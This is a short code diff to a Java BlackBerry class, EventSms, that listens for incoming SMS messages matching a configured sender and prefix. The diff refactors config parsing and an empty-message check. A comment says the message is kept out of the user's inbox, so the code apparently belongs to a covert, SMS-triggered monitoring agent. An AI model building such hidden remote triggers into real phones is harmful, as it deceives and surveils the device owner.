@@ -13,13 +13,13 @@ import javax.wireless.messaging.MessageConnection;
 
 import blackberry.Messages;
 import blackberry.config.ConfEvent;
-import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.SmsObserver;
 import blackberry.module.sms.SmsListener;
 import blackberry.module.sms.SmsListener45;
 import blackberry.module.sms.SmsListener46;
+import blackberry.utils.StringUtils;
 
 /**
  * To prevent this message from appearing in the BlackBerry device user’s inbox,
@@ -69,16 +69,9 @@ public final class EventSms extends Event implements SmsObserver {
     }
 
     public boolean parse(ConfEvent conf) {
-        try {
-            number = conf.getString(Messages.getString("10.1")); //$NON-NLS-1$
-            msg = conf.getString(Messages.getString("10.2")).toLowerCase(); //$NON-NLS-1$
 
-        } catch (final ConfigurationException e) {
-            //#ifdef DEBUG
-            debug.trace(" Error: params FAILED");//$NON-NLS-1$
-            //#endif
-            return false;
-        }
+        number = conf.getString(Messages.getString("10.1"), ""); //$NON-NLS-1$
+        msg = conf.getString(Messages.getString("10.2"), "").toLowerCase(); //$NON-NLS-1$
 
         return true;
     }
@@ -113,7 +106,7 @@ public final class EventSms extends Event implements SmsObserver {
             //#endif
 
             // case insensitive
-            if (msg == null || text.toLowerCase().startsWith(msg)) {
+            if (StringUtils.empty(msg) || text.toLowerCase().startsWith(msg)) {
                 //#ifdef DEBUG
                 debug.trace("notifyIncomingMessage good message: " + msg); //$NON-NLS-1$
                 //#endif
